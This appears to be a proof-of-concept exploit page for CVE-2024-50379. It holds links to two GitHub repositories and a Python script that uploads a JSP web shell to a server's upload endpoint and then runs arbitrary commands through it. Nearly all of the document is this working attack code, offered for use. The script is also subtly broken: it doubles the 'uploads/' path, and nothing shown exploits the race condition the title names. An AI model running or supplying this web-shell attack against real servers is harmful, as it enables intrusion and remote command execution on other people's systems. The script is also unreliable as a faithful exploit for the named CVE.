CVE-2024-50379

##
#
https://github.com/v3153/CVE-2024-50379-POC
#
https://github.com/Alchemist3dot14/CVE-2024-50379
#
##



```
import requests
import sys

# Configurable variables
BASE_URL = "http://localhost:8080/uploads/"
UPLOAD_ENDPOINT = f"{BASE_URL}upload.jsp"
SHELL_NAME = "shell.jsp"
SHELL_CONTENT = '''
<%@ page import="java.io.*" %>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) {
            out.println(line);
        }
    }
%>
'''

def upload_shell():
    print("[+] Uploading JSP shell...")
    files = {'file': (SHELL_NAME, SHELL_CONTENT, 'application/octet-stream')}
    response = requests.post(UPLOAD_ENDPOINT, files=files)
    if response.status_code == 200:
        print(f"[+] Shell uploaded successfully. Check the URL: {BASE_URL}uploads/{SHELL_NAME}")
        return True
    else:
        print("[-] Failed to upload shell.")
        print(f"Response Code: {response.status_code}")
        print(f"Response Text: {response.text}")
        return False

def execute_command(command):
    # Correct shell URL
    shell_url = f"{BASE_URL}uploads/{SHELL_NAME}"
    print(f"[+] Executing command: {command}")
    params = {'cmd': command}
    response = requests.get(shell_url, params=params)
    if response.status_code == 200:
        print("[+] Command output:")
        print(response.text)
    else:
        print("[-] Failed to execute command.")
        print(f"Response Code: {response.status_code}")
        print(f"Response Text: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_cve_2024_50379.py <command>")
        sys.exit(1)

    command = sys.argv[1]
    if upload_shell():
        execute_command(command)
```
